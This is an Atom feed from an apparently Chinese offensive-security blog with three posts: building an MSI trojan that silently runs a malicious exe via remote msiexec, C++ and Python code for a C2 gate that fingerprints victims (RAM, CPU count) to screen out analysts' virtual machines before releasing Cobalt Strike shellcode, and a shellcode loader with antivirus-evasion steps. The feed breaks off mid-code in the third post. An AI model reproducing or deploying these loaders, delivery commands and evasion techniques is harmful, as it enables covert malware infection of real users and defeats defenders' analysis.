<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1y0ng&#39;s Blog</title>
  
  <subtitle>there is no flag</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-09-09T02:26:38.525Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>1y0ng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>msi木马创建</title>
    <link href="http://example.com/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/"/>
    <id>http://example.com/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/</id>
    <published>2023-08-22T02:30:44.000Z</published>
    <updated>2023-09-09T02:26:38.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSI文件">MSI文件</h1><p><code>MSI 文件</code>指的是 <code>Windows Installer Package </code>文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。</p><p>Windows Installer 是 Microsoft Windows 操作系统中的一种安装技术，用于管理和执行软件的安装和卸载过程。MSI 文件是 Windows Installer 技术的核心组成部分，它以.msi 文件扩展名来标识。</p><p>MSI 文件是一种数据库式文件，其中包含了安装程序所需的文件、注册表项、配置信息、脚本和其他相关组件。它提供了一种标准化的方式来描述和定义软件的安装过程，使得软件的安装和管理更加可靠和可预测。</p><p>通过运行 MSI 文件，Windows Installer 将打开一个安装向导，引导用户完成软件的安装过程。安装过程中，Windows Installer 会根据 MSI 文件中的指令和设置，将文件复制到适当的位置，注册组件、创建快捷方式，执行系统配置等操作，最终将软件成功安装到目标计算机上。</p><p>MSI 文件具有一些特性，如安装过程的事务性、修复和升级功能、卸载功能、自定义操作等。它们被广泛用于 Windows 系统中的软件安装，包括应用程序、驱动程序、插件和组件等。</p><p>需要注意的是，运行 MSI 文件通常需要管理员权限或适当的安装权限，以确保安装过程能够成功地对系统进行更改和配置。</p><p>常见的msi:</p><p><img src="image-20230831230437851.png" alt="image-20230831230437851"></p><h1 id="木马制作思路">木马制作思路</h1><p>在MSI软件包中，<code>制作者可以使用自定义操作（Custom Actions）来执行特定的任务</code>，例如运行可执行文件、执行脚本、修改注册表等。当执行安装过程时，MSI软件包会按照事先定义的规则和流程执行这些自定义操作。如果将恶意的exe（也可以是dll、js和vbs）文件作为msi安装过程中要运行的文件，将直接触发恶意代码。</p><p><code>msiexec</code>是Windows操作系统中的命令行实用程序，用于处理MSI（Microsoft Installer）文件。它是Microsoft Installer的执行引擎，负责解析和执行MSI文件中定义的安装、修复、更新和卸载操作。msiexec支持<code>远程加载</code>msi文件并安装。</p><p>相当于通过msiexec间接运行我们的恶意exe，整个过程无文件落地。</p><h1 id="创建msi文件">创建msi文件</h1><p>msi文件可以通过<a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">Advanced Installer</a><a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">1</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">，Discover</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">2</a>，或者Visual Studio等方式创建，这里我们以Visual Studio 2022为例。</p><h2 id="下载安装插件">下载安装插件</h2><p>首先要下载安装<code>Visual Studio Installer Projects</code>插件，在vs中点击左上角<code>拓展</code>—&gt;<code>管理拓展</code>，直接搜索下载安装</p><p><img src="image-20230831232418630.png" alt="image-20230831232418630"></p><p>这样可能会比较慢，也可以直接下载<a href="https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects">拓展包</a>安装。</p><h2 id="添加Setup-Project项目">添加Setup Project项目</h2><p>创建一个新的<code>Setup Project</code>项目</p><p><img src="image-20230831232701251.png" alt="image-20230831232701251"></p><p>添加<code>项目输出</code></p><p><img src="image-20230831232813669.png" alt="image-20230831232813669"></p><p>选择<code>主输出</code></p><p><img src="image-20230831232832022.png" alt="image-20230831232832022"></p><blockquote><p>可能会遇到项目输出是空的情况，应该是解决方案配置的问题，建议不要创建一个Setup Project项目的解决方案，而是在已有解决方案项目的情况下添加Setup Project项目</p><p><img src="image-20230831234805675.png" alt="image-20230831234805675"></p></blockquote><h2 id="添加恶意exe">添加恶意exe</h2><p>右键项目选择<code>自定义操作</code></p><p><img src="image-20230831232942395.png" alt="image-20230831232942395"></p><p>发现有四个操作分别为<code>&quot;安装&quot;、&quot;提交&quot;、&quot;回滚&quot;和&quot;卸载&quot;</code></p><p><img src="image-20230831233023014.png" alt="image-20230831233023014"></p><p>在安装程序中，“安装”、“提交”、&quot;回滚&quot;和&quot;卸载&quot;是四个常见的操作类型，它们用于描述不同的安装过程中的行为和阶段。</p><ol><li>安装（Install）：安装操作是指将应用程序或软件包安装到目标计算机上的过程。在安装操作中，文件、注册表项、服务、组件等将被复制、配置和注册到目标计算机的适当位置。通常，安装操作会创建所需的目录结构、注册必要的组件，并执行其他必要的配置任务。</li><li>提交（Commit）：提交操作是指在安装过程中，当所有的文件和配置都已成功复制和注册到目标计算机时，确认将更改应用到系统的阶段。在提交操作之前，所有的安装操作都被视为临时性的。提交操作会将安装所做的更改永久性地应用到系统中，以确保应用程序的完整性和可用性。</li><li>回滚（Rollback）：回滚操作是指当安装过程中发生错误或遇到问题时，将安装过程还原到初始状态的过程。如果在安装过程中出现错误，安装程序可以回滚（撤销）之前的所有操作，以恢复目标计算机到安装前的状态，以避免对系统造成不可逆的更改。</li><li>卸载（Uninstall）：卸载操作是指从目标计算机中完全移除已安装的应用程序或软件包的过程。在卸载操作中，与安装过程相反，文件、注册表项、服务等与应用程序相关的组件将被删除，以及执行其他必要的清理任务。</li></ol><p>我们选择”安装“，右键添加自定义操作</p><p>Add File可以添加具体的运行文件，这里以一个简单的弹框exe模拟恶意脚本</p><p><img src="image-20230831233355250.png" alt="image-20230831233355250"></p><p>点击OK则成功添加到”安装“操作中</p><p><img src="image-20230831233542197.png" alt="image-20230831233542197"></p><p>点击重新生成将生成两个文件，msi文件就是我们嵌入了恶意exe的目标文件</p><p><img src="image-20230831233711946.png" alt="image-20230831233711946"></p><h1 id="利用">利用</h1><p>先用python起一个临时服务器，然后再目标主机上运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /i msi文件的url地址 /q TARGETDIR=&quot;C:/Users/Public/Documents&quot;</span><br></pre></td></tr></table></figure><ul><li><code>/i</code> 是 msiexec 命令的参数，表示执行安装操作。</li><li><code>/q</code> 是 msiexec 命令的参数，表示以安静（静默）模式执行安装，即在不显示任何用户界面的情况下执行安装过程。</li><li>TARGETDIR指定程序的安装位置，不指定的话则默认安装到Program Files下，则会有权限不够以及UAC的情况</li></ul><p>发现恶意exe被执行（messagebox.exe的功能就是弹出一个niupi）</p><p><img src="image-20230831234223966.png" alt="image-20230831234223966"></p><p>参考：</p><p><a href="https://blog.csdn.net/syzcyyx/article/details/129482721">使用VisualStudio2022插件(Visual Studio Installer Projects 2022)打包 .Net 6 框架下的 WPF项目 为安装文件</a></p><p><a href="https://blog.csdn.net/weixin_44790046/article/details/103016154">VS2019打包生成安装文件图文详细教程</a></p><p><a href="https://blog.csdn.net/wmonica121/article/details/13503791">vs2010打包程序   项目输出组为空</a></p><p><a href="https://www.c-sharpcorner.com/article/how-to-perform-custom-actions-and-upgrade-using-visual-studio-installer/">如何使用 Visual Studio 安装程序执行自定义操作和升级 (c-sharpcorner.com)</a></p><p><a href="https://www.red-gate.com/simple-talk/development/dotnet-development/visual-studio-setup-projects-and-custom-actions/">Visual Studio 设置 - 项目和自定义操作 - 简单对话 (red-gate.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MSI文件&quot;&gt;MSI文件&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;MSI 文件&lt;/code&gt;指的是 &lt;code&gt;Windows Installer Package &lt;/code&gt;文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。&lt;/p&gt;
&lt;p&gt;Windows In</summary>
      
    
    
    
    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="木马" scheme="http://example.com/tags/%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>一个简单的准接入</title>
    <link href="http://example.com/post/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%86%E6%8E%A5%E5%85%A5/"/>
    <id>http://example.com/post/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%86%E6%8E%A5%E5%85%A5/</id>
    <published>2023-07-02T06:05:10.000Z</published>
    <updated>2023-07-02T08:59:38.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="目标">目标</h1><p>教育护网的时候出现了钓鱼的木马样本被安全人员分析导致cs服务器的ip被封的情况，就想着写一个简单的<code>准接入控制平台</code>，来控制肉鸡是否允许连接至cs服务器。</p><p>理想效果是：<strong>点击木马以后，会先发送连接请求到接入控制服务器，在服务器上允许接入以后，木马运行shellcode，否则程序结束。</strong></p><p>肉鸡在请求连接的时候，会携带电脑的部分信息（处理器数量、内存大小等），方便攻击者判断是否为虚拟机环境</p><h1 id="开搞">开搞</h1><p>思路：控制服务器打算用python的<code>flask</code>来写，客户端与服务器的通信采用<code>socket连接</code></p><ol><li>客户端会发送自己的<code>内存大小</code>以及<code>处理器数量</code>给服务端</li><li>服务端将数据在网页中显示</li><li>攻击者选择是否允许接入</li><li>将选择结果返回给客户端</li></ol><h2 id="获取内存大小以及处理器数量">获取内存大小以及处理器数量</h2><p>windows中自带了API可以非常方便的用来获取这两个参数，分别是<code>GlobalMemoryStatusEx</code>方法和<code>GetSystemInfo</code>方法</p><p>具体代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取内存大小</span></span><br><span class="line">MEMORYSTATUSEX meminfo;</span><br><span class="line">meminfo.dwLength = <span class="built_in">sizeof</span>(MEMORYSTATUSEX);</span><br><span class="line"><span class="built_in">GlobalMemoryStatusEx</span>(&amp;meminfo);</span><br><span class="line">DWORDLONG  memory_num = meminfo.ullTotalPhys / (<span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line"><span class="comment">//获取处理器数量</span></span><br><span class="line">SYSTEM_INFO sysinfo;</span><br><span class="line"><span class="built_in">GetSystemInfo</span>(&amp;sysinfo);</span><br><span class="line">DWORD core_count = sysinfo.dwNumberOfProcessors; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">to_string</span>(memory_num)+ <span class="string">&quot;,&quot;</span>+ <span class="built_in">to_string</span>(core_count);</span><br></pre></td></tr></table></figure><p>如果电脑是16G内存带有16个处理器的话，该程序会返回一个字符串“16000,16”</p><h2 id="socket客户端">socket客户端</h2><p>用c++来写socket主要利用的是<code>ws2_32.lib</code>，所以要先导入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>接下来就是调用对应的api进行操作了，整体代码为:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化Winsock库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> iResult = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;WSAStartup failed: &quot;</span> &lt;&lt; iResult &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个TCP socket</span></span><br><span class="line">SOCKET ConnectSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (ConnectSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;socket failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定服务端的IP地址和端口号</span></span><br><span class="line">sockaddr_in serverAddr;</span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_addr.s_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.200.225&quot;</span>); <span class="comment">// 服务端IP地址</span></span><br><span class="line">serverAddr.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>); <span class="comment">// 服务端端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接到服务端</span></span><br><span class="line">iResult = <span class="built_in">connect</span>(ConnectSocket, (SOCKADDR*)&amp;serverAddr, <span class="built_in">sizeof</span>(serverAddr));</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;connect failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送数据到服务端</span></span><br><span class="line">iResult = <span class="built_in">send</span>(ConnectSocket, sendData.<span class="built_in">c_str</span>(), sendData.<span class="built_in">length</span>(), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;send failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收服务端返回的数据</span></span><br><span class="line"><span class="type">char</span> recvData[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">iResult = <span class="built_in">recv</span>(ConnectSocket, recvData, <span class="built_in">sizeof</span>(recvData), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Received: &quot;</span> &lt;&lt; recvData[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (recvData[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;服务端不准许接入&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Connection closed&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;recv failed: &quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭socket连接</span></span><br><span class="line"><span class="built_in">closesocket</span>(ConnectSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br></pre></td></tr></table></figure><p>上述代码会通过socket连接到192.168.200.225的9999端口，发送<code>sendData</code>，并等待返回数据，如果返回1则输出“服务端准许接入”，返回0则输出“服务端不准许接入”</p><h2 id="socket服务端">socket服务端</h2><p>服务端用python来写，通过<code>socketserver</code>这个包来处理多个客户端的连接请求。</p><p>首先定义一个<code>socket_server_start</code>方法来监听<code>socket请求</code>，当连接建立以后将会调用<code>MyTCPHandler类</code>的<code>handle</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">socket_server_start</span>():</span><br><span class="line">    HOST, PORT = <span class="string">&quot;192.168.200.225&quot;</span>, <span class="number">9999</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;server start listen on &#x27;</span>+PORT)</span><br><span class="line">    <span class="keyword">with</span> socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler) <span class="keyword">as</span> server:</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyTCPHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Server is listening on &#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.client_address[<span class="number">0</span>], self.client_address[<span class="number">1</span>]))</span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>).strip().decode()</span><br><span class="line">        memory,core  = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;内存大小为：&#123;&#125;MB，处理器数量为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(memory,core))</span><br></pre></td></tr></table></figure><p>在获取到计算机硬件信息后，将信息存储到一个列表里，通过flask创建一个路由用来返回json格式的数据，再在前端通过fetch来获取数据并显示出来</p><h2 id="显示数据">显示数据</h2><p>通过displayBox函数将收到的数据显示出来</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">displayBox</span>(<span class="params">time,ip, memory, core</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> content = <span class="string">&quot;连接时间为：&quot;</span>+time+<span class="string">&quot;&lt;br&gt;IP地址为：&quot;</span> + ip + <span class="string">&quot;&lt;br&gt;内存大小为：&quot;</span> + memory + <span class="string">&quot;MB&lt;br&gt;处理器数量为：&quot;</span> + core + <span class="string">&quot;个&lt;div&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 1)&#x27;&gt;允许&lt;/button&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 0)&#x27; &gt;拒绝&lt;/button&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> box = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  box.<span class="property">className</span> = <span class="string">&quot;red-box&quot;</span>;</span><br><span class="line">  box.<span class="property">innerHTML</span> = content;</span><br><span class="line">  container.<span class="title function_">appendChild</span>(box);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="“允许”或“拒绝”">“允许”或“拒绝”</h2><p>在上述函数中，点击“允许”调用<code>AllowFunction(ip,1)</code>，点击拒绝则调用<code>AllowFunction(ip,0)</code></p><p>通过AllowFunction函数向flask服务器发起一个请求来修改对应ip的准接入结果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">function</span> <span class="title function_">AllowFunction</span>(<span class="params">ip, isallow</span>)&#123;</span><br><span class="line"><span class="comment">// 构建请求的 URL</span></span><br><span class="line">  <span class="keyword">const</span> url = host+<span class="string">`change?ip=<span class="subst">$&#123;ip&#125;</span>&amp;isallow=<span class="subst">$&#123;isallow&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 发起 GET 请求</span></span><br><span class="line">  <span class="title function_">fetch</span>(url)</span><br><span class="line">   .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;请求成功&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求失败&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">   .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求发生错误&quot;</span>, error);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure><p>最后回到socket服务端，将修改后的结果返回给socket客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.request.sendall(<span class="built_in">str</span>(cmps[i][<span class="string">&quot;isallow&quot;</span>]).encode())</span><br></pre></td></tr></table></figure><h1 id="效果">效果</h1><p><img src="image-20230702154823650.png" alt="image-20230702154823650"></p><p>第一个是真机，第二个是虚拟机<img src="image-20230702164949851.png" alt="image-20230702164949851"></p><h1 id="升级">升级</h1><p>通过准接入系统可以做的事情还有很多，可以试着携带更多的信息来帮助我们判断是真机还是虚拟机，同时也可以将shellcode放到服务器，允许接入后将shellocde返回给客户端并加载。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;目标&quot;&gt;目标&lt;/h1&gt;
&lt;p&gt;教育护网的时候出现了钓鱼的木马样本被安全人员分析导致cs服务器的ip被封的情况，就想着写一个简单的&lt;code&gt;准接入控制平台&lt;/code&gt;，来控制肉鸡是否允许连接至cs服务器。&lt;/p&gt;
&lt;p&gt;理想效果是：&lt;strong&gt;点击木马以后，</summary>
      
    
    
    
    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="准入" scheme="http://example.com/tags/%E5%87%86%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码逃逸学习</title>
    <link href="http://example.com/post/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/post/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-06-15T06:55:30.000Z</published>
    <updated>2023-06-15T15:25:43.461Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透的过程中会经常遇到对方机器安装了杀软的情况，这时就需要用到免杀技术，之前钓鱼邮件中提到的免杀是用GO写的，但我觉得这种东西还是更靠近计算机底层为好，正好这几天看了<a href="https://payloads.online">倾旋大佬的博客</a>，对于用c++来实现恶意代码逃逸学到了很多，特此记录</p><h1 id="简单的加载shellcode">简单的加载shellcode</h1><p>首先我们要让cobalt strike生成的shellcode运行起来一共就三个步骤</p><ol><li>申请计算机内存</li><li>将shellcode加载进内存</li><li>执行这一段内存</li></ol><p>上面三个步骤对应的代码为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/* length: 891 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b......&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">//申请计算机内存</span></span><br><span class="line">LPVOID exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode加载进内存</span></span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(exec, buf, size);</span><br><span class="line">    <span class="comment">//执行这一段内存</span></span><br><span class="line">((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将以上代码生成的exe直接运行就可以上线CS了，但如果有杀软的话就会直接报毒</p><p><img src="image-20230615154428359.png" alt="image-20230615154428359"></p><p>针对这一情况，我们将采取一系列的措施来绕过</p><h1 id="免杀操作">免杀操作</h1><h2 id="申请可读写内存页">申请可读写内存页</h2><p>杀软对于<code>可执行内存页</code>的申请监控是非常严格的，所以我们可以先申请一个普通的<code>可读写内存页</code>，再通过VirtualProtect改变它的属性为可执行，代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/* length: 891 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b......&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> 